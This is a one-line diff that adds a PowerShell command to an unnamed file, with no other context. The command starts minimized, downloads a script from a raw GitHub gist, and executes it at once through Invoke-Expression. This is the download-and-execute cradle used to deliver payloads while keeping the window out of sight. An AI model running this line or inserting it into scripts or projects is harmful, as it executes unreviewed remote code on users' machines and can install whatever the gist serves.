@@ -1,0 +1,1 @@
+powershell -WindowStyle Minimized Invoke-Expression (new-object net.webclient).downloadstring('https://gist.githubusercontent.com/amoujhang/a903e12527773ec381ddac9362249333/raw/');
